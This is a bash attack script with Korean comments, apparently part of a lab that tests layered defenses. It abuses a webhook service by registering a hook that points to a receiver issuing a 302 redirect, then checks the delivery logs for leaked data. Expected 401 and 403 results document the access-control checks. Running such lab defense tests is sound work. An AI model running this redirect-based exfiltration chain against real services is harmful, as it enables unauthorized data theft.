#!/usr/bin/env bash
# 칼리 VM 에서: ./attack-plane.sh [토큰]
#   인자 없으면 기본 lab-alice-token(admin, 공격 성공 케이스) 사용.
#   3계층(접근 제어) 테스트용: ./attack-plane.sh lab-viewer-token (403 기대), ./attack-plane.sh invalid-token-xxxx (401 기대)
#   비동기(큐 기반) 방식이라 2계층(네트워크 차단) 테스트 시 배달 처리에 시간이 걸릴 수 있음 —
#   그 경우 sleep 값을 늘리고 같은 run_id로 재조회할 것. 빠른 레이어 검증에는 attack-mlflow.sh 권장.
set -euo pipefail
BASE="http://webhook:8000"
TOKEN="${1:-lab-alice-token}"   # 인자 없으면 기본 alice(admin) 토큰 사용
WORKSPACE="alpha"
RUN_ID="$(python3 -c 'import uuid;print(uuid.uuid4())')"
echo "RUN_ID=$RUN_ID"
echo "사용 토큰: $TOKEN"

HTTP_STATUS=$(curl -s -o /tmp/reg.json -w "%{http_code}" -X POST "$BASE/api/workspaces/$WORKSPACE/hooks" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{\"name\":\"plane-attack\",\"url\":\"https://receiver:8443/redirect?status=302\",\"events\":[\"issue.updated\"],\"run_id\":\"$RUN_ID\"}")

echo "hook 등록 응답 코드: $HTTP_STATUS"
python3 -m json.tool /tmp/reg.json 2>/dev/null || cat /tmp/reg.json

if [ "$HTTP_STATUS" != "200" ] && [ "$HTTP_STATUS" != "201" ]; then
  echo
  echo "### 공격 중단: hook 등록 단계에서 차단됨 (HTTP $HTTP_STATUS) ###"
  echo "### 3계층(접근 제어)에 의해 공격 체인이 초입에서 막혔습니다 — 데이터 유출 없음 ###"
  exit 1
fi

curl -s -X POST "$BASE/api/workspaces/$WORKSPACE/events" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{\"event\":\"issue.updated\",\"run_id\":\"$RUN_ID\"}" | python3 -m json.tool

sleep 1
echo "--- 배달 로그 (여기서 유출 확인) ---"
curl -s "$BASE/api/workspaces/$WORKSPACE/deliveries?run_id=$RUN_ID" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
